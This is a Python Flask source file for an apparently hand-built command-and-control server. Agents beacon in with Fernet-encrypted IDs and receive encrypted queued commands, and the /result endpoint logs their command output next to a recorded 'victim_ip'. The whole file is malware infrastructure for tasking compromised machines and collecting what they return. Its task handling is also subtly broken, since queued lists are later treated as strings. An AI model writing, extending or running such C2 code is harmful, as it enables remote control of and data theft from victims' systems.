import flask
import hashlib
import cryptography

from cryptography.fernet import Fernet
from flask import Flask, request, jsonify

app = Flask(__name__)


# In-memory task list
tasks = {}

key = Fernet.generate_key()
cipher_suite = Fernet(key)

print(f"[!] TEMPORARY AGENT KEY: {key.decode('utf-8')}")


@app.route('/beacon', methods=['POST'])
def beacon():
    # 1. Receive the agent's JSON
    data = request.get_json()
    encrypted_id = data.get("id")

    # 2. THE MISSING PIECE: The Server's Inbound Sandwich
    # We must decrypt the ID before we can check the tasks dictionary
    id_bytes = encrypted_id.encode("utf-8")
    decrypted_id_bytes = cipher_suite.decrypt(id_bytes)
    decrypted_id_string = decrypted_id_bytes.decode("utf-8")

    # Optional but highly recommended: Print a notification to your server console
    print(f"[+] Agent {decrypted_id_string} checked in!")

    # 3. Check the task queue
    task = tasks.pop(decrypted_id_string, None)

    # 4. If no task exists, default to "SLEEP"
    if not task:
        task = "SLEEP"

    # 5. The Server's Outbound Sandwich (Encrypting the command)
    task_bytes = task.encode("utf-8")
    encrypted_task_bytes = cipher_suite.encrypt(task_bytes)
    safe_task_string = encrypted_task_bytes.decode("utf-8")

    # 6. Send the securely packaged task back to the agent
    return jsonify({"task": safe_task_string})

@app.route('/result', methods=['POST'])
def result():
    victim_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    agent_id = request.json.get('id').encode("utf-8")
    decrypted_id = cipher_suite.decrypt(agent_id)
    standard_id = decrypted_id.decode("utf-8")
    output = request.json.get('output').encode("utf-8")
    decrypted_output = cipher_suite.decrypt(output)
    standard_output = decrypted_output.decode("utf-8")
    print(f"[+] Result from {standard_id} at {victim_ip}:\n{standard_output}\n")
    return jsonify({"status": "received"})

@app.route('/task', methods=['POST'])
def task():
    agent_id = request.json.get('id')
    command = request.json.get('command')
    if agent_id not in tasks:
        tasks[agent_id] = []
    tasks[agent_id].append(command)
    return jsonify({"status": "task queued"})

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)